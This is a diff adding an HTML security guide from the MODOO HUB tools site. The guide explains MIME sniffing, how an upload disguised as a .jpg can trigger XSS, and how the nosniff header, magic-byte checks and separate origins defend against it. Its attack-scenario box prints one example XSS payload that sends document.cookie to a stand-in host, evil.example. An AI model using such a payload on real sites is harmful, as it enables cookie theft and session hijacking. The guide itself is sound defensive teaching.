@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>What Is MIME Sniffing, and Why Do You Need a Security Header for It? | MODOO HUB</title>
+<meta name="description" content="How MIME sniffing lets a browser ignore Content-Type and guess a file's real type from its content, how an uploaded image can be turned into an XSS attack vector, and how the nosniff header blocks it — explained from first principles.">
+<link rel="canonical" href="https://modoohub.com/guides/mime-type-sniffing-nosniff-header-en.html">
+<link rel="alternate" hreflang="ko" href="https://modoohub.com/guides/mime-type-sniffing-nosniff-header.html">
+<link rel="alternate" hreflang="en" href="https://modoohub.com/guides/mime-type-sniffing-nosniff-header-en.html">
+<link rel="alternate" hreflang="x-default" href="https://modoohub.com/guides/mime-type-sniffing-nosniff-header.html">
+<link rel="icon" type="image/x-icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;600;700&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NR6VJF0534"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-NR6VJF0534');</script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3371462986089885" crossorigin="anonymous"></script>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"Article","headline":"What Is MIME Sniffing, and Why Do You Need a Security Header for It?","description":"How MIME sniffing lets a browser ignore Content-Type and guess a file's real type from its content, how an uploaded image can be turned into an XSS attack vector, and how the nosniff header blocks it.","datePublished":"2026-08-26","dateModified":"2026-08-26","author":{"@type":"Organization","name":"MODOO HUB"}}
+</script>
+<style>
+:root{--bg:#0a0a0a;--surface:#141414;--surface2:#1a1a1a;--border:#252525;--accent:#fbbf24;--accent2:#f59e0b;--text:#f5f5f5;--text-muted:#888;--text-dim:#444;--green:#4ade80;--red:#f87171;--blue:#60a5fa;--purple:#c084fc;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:'Noto Sans KR',sans-serif;min-height:100vh;line-height:1.8;}
+header{border-bottom:1px solid var(--border);padding:16px 20px;display:flex;align-items:center;gap:10px;}
+.logo{font-size:12px;color:var(--text-muted);font-family:'DM Mono',monospace;letter-spacing:.1em;}
+.back-link{margin-left:auto;font-size:12px;color:var(--text-dim);text-decoration:none;}
+.back-link:hover{color:var(--text-muted);}
+main{max-width:760px;margin:0 auto;padding:40px 20px 80px;}
+h1{font-size:clamp(24px,4vw,34px);font-weight:700;margin-bottom:10px;line-height:1.3;}
+.meta{font-size:13px;color:var(--text-dim);margin-bottom:36px;}
+h2{font-size:20px;font-weight:700;margin:36px 0 14px;color:var(--text);border-left:3px solid var(--accent);padding-left:12px;}
+h3{font-size:16px;font-weight:700;margin:22px 0 10px;color:var(--text-muted);}
+p{font-size:15px;color:#ccc;margin-bottom:14px;}
+a{color:var(--accent);text-decoration:none;}
+a:hover{text-decoration:underline;}
+table{width:100%;border-collapse:collapse;margin:16px 0;font-size:13px;}
+th,td{border:1px solid var(--border);padding:8px 10px;text-align:left;}
+th{background:var(--surface);color:var(--text-muted);font-weight:700;}
+td{color:#ccc;}
+.box{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px 20px;margin:18px 0;}
+.box strong{color:var(--accent);}
+ul,ol{margin:10px 0 14px 22px;color:#ccc;font-size:15px;}
+li{margin-bottom:6px;}
+.tool-links{display:flex;flex-wrap:wrap;gap:8px;margin:24px 0;}
+.tool-links a{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:8px 14px;font-size:13px;color:var(--text-muted);}
+.tool-links a:hover{border-color:var(--accent);color:var(--accent);text-decoration:none;}
+footer{border-top:1px solid var(--border);margin-top:60px;padding-top:20px;font-size:12px;color:var(--text-dim);}
+</style>
+</head>
+<body>
+<header>
+  <span class="logo">MODOO HUB</span>
+  <a href="../index.html" class="back-link">← All Tools</a>
+</header>
+<main>
+  <h1>What Is MIME Sniffing, and Why Do You Need a Security Header for It?</h1>
+  <p class="meta">Guide · Last verified Aug 26, 2026</p>
+
+  <p>If a server responds with a <code>Content-Type: image/jpeg</code> header attached to a file, you'd expect the browser to obviously treat it as an image. In practice, that's not always true. Browsers have a feature that only treats the server's declared Content-Type as a suggestion, then peeks at the actual file content to guess the "real type" on its own. This is called MIME sniffing, and this guide breaks down why that behavior becomes a security problem, and why the <code>X-Content-Type-Options: nosniff</code> header exists.</p>
+
+  <h2>1. Why Browsers Don't Trust the Server</h2>
+  <p>In the early web, it was common for a server misconfiguration to send an incorrect Content-Type — for example, many servers mistakenly responded to image files with <code>text/plain</code>. To keep pages from breaking under conditions like that, browser vendors going back to early Internet Explorer started building in a feature: "if the Content-Type looks odd or ambiguous, inspect the first few bytes of the file (the magic number) directly and determine the real type." It was designed for tolerance, but from a security standpoint, it produced the opposite result.</p>
+
+  <h2>2. The Trust Boundary Sniffing Breaks</h2>
+  <p>One of the basic assumptions of web security is: "if the server declares a file to be an image, the browser will only ever treat it as an image." Sniffing breaks that assumption. If an attacker uploads a file that actually contains HTML or JavaScript code but disguises it with an image extension (like .jpg), and the server responds with <code>image/jpeg</code> anyway, a browser that inspects the file content can determine "this is actually HTML" and <strong>render it as an HTML document.</strong> In other words, even on a board that only allows image uploads, extension and Content-Type validation alone are not enough to fully block uploads of executable content.</p>
+  <div class="box">
+    <strong>Attack scenario</strong>: A user embeds <code>&lt;script&gt;document.location='https://evil.example/steal?c='+document.cookie&lt;/script&gt;</code> at the start of a file, disguises the extension as .jpg, and uploads it as a profile image → the server only checks the extension, saves the file, and responds with <code>Content-Type: image/jpeg</code> → a browser that allows sniffing inspects the content and reinterprets it as HTML → it renders on the same domain (origin) and the script executes, stealing another user's cookies (XSS)</strong>
+  </div>
+
+  <h2>3. Where the nosniff Header Steps In</h2>
+  <p>Adding an <code>X-Content-Type-Options: nosniff</code> header to a server response tells the browser to skip the content-inspection sniffing step entirely and trust the server's declared Content-Type as-is. Even if the server declares <code>image/jpeg</code> while the actual content is HTML, the browser will only try to treat the file as an image (it may show up as a broken image if rendering fails) and will never execute it as HTML. In short, nosniff turns off "browser tolerance" and enforces "server response trustworthiness" instead. It's recommended to attach this header by default on every endpoint that serves user-uploaded files, especially image and attachment download paths. Pairing it with a Content-Security-Policy built through the <a href="../csp-generator.html?lang=en">CSP Generator</a> adds an extra layer of defense.</p>
+
+  <h2>4. The MIME Type Shown by This Tool Is Not a Sniffing Result</h2>
+  <p>There's one point that's easy to confuse. When you drag and drop a file into the <a href="../mime-type-finder.html?lang=en">MIME Type Finder</a>, it displays a "detected MIME type" — but this is not the result of the browser analyzing the file's content. What it actually shows is the browser's File API <code>file.type</code> value as-is, and in most browser/OS combinations that value is determined by the <strong>file extension</strong> (if the value is empty, the tool falls back to its own extension-to-MIME mapping table). In other words, this tool performs pure extension-based detection, which is different from "how the browser sniffs a server response." Don't confuse the two — the real security-relevant sniffing happens when a server response is processed and its content (the magic bytes) is read directly, which is an entirely separate mechanism from looking up a local file's extension on the client.</p>
+
+  <h2>5. What to Check in Practice</h2>
+  <p>If you're running a service that handles user uploads, it's worth checking these in order. First, at upload time, verify the real file type by inspecting the actual magic bytes rather than trusting the extension. Second, when the server responds, always include the correct Content-Type alongside the nosniff header. Third, wherever possible, serve uploaded files from a separate subdomain (an origin that doesn't share cookies) so that even if a script somehow executes, it can't reach the session or cookies on your main domain. You can check right away whether nosniff is actually set correctly on a live response using the <a href="../http-header-checker.html?lang=en">HTTP Header Checker</a>.</p>
+
+  <h2>Frequently Asked Questions</h2>
+  <details style="border:1px solid var(--border);border-radius:6px;margin-bottom:8px;padding:10px 14px;"><summary style="cursor:pointer;font-weight:600;color:var(--text-muted);">Q. Are there any downsides to turning on nosniff?</summary><p style="margin-top:8px;">If the server responds with an incorrect Content-Type, the browser will trust that value literally, so a perfectly valid file might appear broken or get handled in an unintended way instead of a normal download. Before applying nosniff, you should verify that every response path's Content-Type accurately matches the actual file format.</p></details>
+  <details style="border:1px solid var(--border);border-radius:6px;margin-bottom:8px;padding:10px 14px;"><summary style="cursor:pointer;font-weight:600;color:var(--text-muted);">Q. Can extension checking alone safely block dangerous uploads?</summary><p style="margin-top:8px;">No. An extension is just part of a filename, and a user can set it to anything regardless of the actual content. Safe upload validation needs to read the file's first few bytes (the magic number) to confirm the real format — an extension whitelist should only be used as a secondary safeguard.</p></details>
+  <details style="border:1px solid var(--border);border-radius:6px;margin-bottom:8px;padding:10px 14px;"><summary style="cursor:pointer;font-weight:600;color:var(--text-muted);">Q. Is SVG dangerous too, not just HTML/JS files?</summary><p style="margin-top:8px;">Yes. SVG is an XML-based image format that can contain a <code>&lt;script&gt;</code> tag inside it, making it a prime example of a format that "looks like an image but can carry executable code." If you allow SVG uploads, it's safest to sanitize (strip script tags) on the server or serve them from a separate origin along with nosniff.</p></details>
+  <details style="border:1px solid var(--border);border-radius:6px;margin-bottom:8px;padding:10px 14px;"><summary style="cursor:pointer;font-weight:600;color:var(--text-muted);">Q. What does a browser do if there's no Content-Type header at all?</summary><p style="margin-top:8px;">If the Content-Type is missing, or a generic type like <code>application/octet-stream</code> is used, the browser is more likely to fall back on sniffing. Explicitly specifying the correct Content-Type on every path that serves files is the first step toward reducing sniffing risk.</p></details>
+
+  <div class="tool-links">
+    <a href="../mime-type-finder.html?lang=en">→ MIME Type Finder</a>
+    <a href="../http-header-checker.html?lang=en">→ HTTP Header Checker</a>
+    <a href="../csp-generator.html?lang=en">→ CSP Generator</a>
+    <a href="../csp-validator.html?lang=en">→ CSP Validator</a>
+    <a href="../cors-header-checker.html?lang=en">→ CORS Header Checker</a>
+    <a href="../htaccess-generator.html?lang=en">→ .htaccess Generator</a>
+  </div>
+
+  <footer>© 2026 MODOO HUB · This guide is provided for general informational purposes; for actual production security settings, we also recommend a review by a security professional.</footer>
+</main>
+</body>
+</html>
